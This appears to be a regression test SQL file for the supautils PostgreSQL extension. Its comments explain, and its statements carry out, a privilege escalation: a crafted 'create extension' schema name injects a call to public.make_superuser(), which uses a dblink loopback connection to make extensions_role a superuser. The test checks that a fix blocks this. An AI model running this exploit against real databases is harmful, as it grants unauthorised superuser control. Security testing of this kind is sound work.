-- Supautils substitutes values for the following variables in extension custom
-- scripts before running them:
--
-- 1. @extname@
-- 2. @extschema@
-- 3. @extversion@
-- 4. @extcascade@
--
-- If the substitution logic is not written carefully and these variables occur
-- in custom scripts at an expression evaluation context, an attacker can craft
-- sql which can escalate a non-superuser role into superuser. The vulnerable
-- substitution code does something like this:
--
-- do $_$
-- begin
--   execute replace(replace(replace(replace(
--     pg_read_file('before-create.sql'),
--     '@extname@', <extension-name>),
--     '@extschema@', <extension-schema>'),
--     '@extversion@', <extension-version>),
--     '@extcascade@', <extension-cascade>);
-- end; $_$;
--
-- This code reads an extension script file and first substitutes @extname@ with
-- <extension-name>, then in the result it replaces @extschema@ with <extension-schema>
-- and so on. If the custom script looks something like the following:
--
-- do $$
-- declare
--   extname text := @extname@;
--   extschema text := @extschema@;
-- begin
--  ...
-- end
--
-- Then the attacker can construct the following sql:
--
-- create extension "@extschema@" schema " || public.make_superuser() || ";
--
-- which transforms the script step by step as follows.
--
-- Step 1, replace @extname@ with `@extschema@`:
--
-- do $$
-- declare
--   extname text := '@extschema@';
--   extschema text := @extschema@;
-- begin
--  ...
-- end
--
-- Note the single quotes around the replaced value @extschema@, those are added
-- by the c code not shown above by calling the quote_literal_cstr function. Next,
-- the second replacement occurs.
--
-- Step 2, replace @extschema@ with ` || public.make_superuser() || `:
--
-- do $$
-- declare
--   extname text := '' || public.make_superuser() || '';
--   extschema text := ' || public.make_superuser() || ';
-- begin
--  ...
-- end
--
-- This code is now ready to detonate: the right side of `extname text :=` has
-- become an expression which when evaluated calls public.make_superuser() function
-- and concatenates its result with empty strings on the either side.
--
-- Now the attacker writes an appropriate definition for public.make_superuser
-- function. For example:
--
-- create or replace function public.make_superuser() returns text
-- language plpgsql
-- as $$
-- begin
--   alter role extensions_role superuser;
--   return '';
-- end
-- $$;
--
-- But there's one last hiccup, remember the original sql to create the extension:
--
-- create extension "@extschema@" schema " || public.make_superuser() || ";
--
-- This will fail because there's no extension named @extschema@:
--
-- ERROR:  extension "@extschema@" is not available
-- HINT:  The extension must first be installed on the system where PostgreSQL is running.
--
-- And the transaction will rollback, reverting the change done to make extension_role
-- superuser. The attacker can workaround this by calling the elevation code via the dblink
-- extension. dblink makes a new connection via loopback and commits the inner transaction
-- even though the outer transaction is rolled back.
--
-- create extension if not exists dblink;
--
-- create or replace function public.make_superuser() returns text
-- language plpgsql
-- as $$
-- begin
--   perform dblink_exec(
--     'dbname=postgres user=postgres',
--     'alter role extensions_role superuser'
--   );
--   return '';
-- end
-- $$;
--
-- This completes the privilege escalation attack.

-- Needed to create the public.make_superuser function below
grant create on schema public to extensions_role;
set role extensions_role;
\echo

-- Confirm that extensions_role is not superuser
select current_user, rolsuper
from pg_roles
where rolname = current_user;
\echo

-- Preparation for the attack
create extension if not exists dblink;
create or replace function public.make_superuser() returns text
language plpgsql
as $$
begin
  perform dblink_exec(
    'dbname=postgres user=postgres',
    'alter role extensions_role superuser'
  );
  return '';
end
$$;
\echo

-- Execute the actual attack, the error about @extschema@ extension not being
-- available is expected
create extension "@extschema@" schema " || public.make_superuser() || ";
\echo

-- Check whether extensions_role is now superuser or not. Before the fix
-- the role would become a superuser. After the fix we expect the role
-- to stay as a non-superuser
select current_user, rolsuper
from pg_roles
where rolname = current_user;

-- Cleanup
drop extension dblink cascade;
drop function public.make_superuser;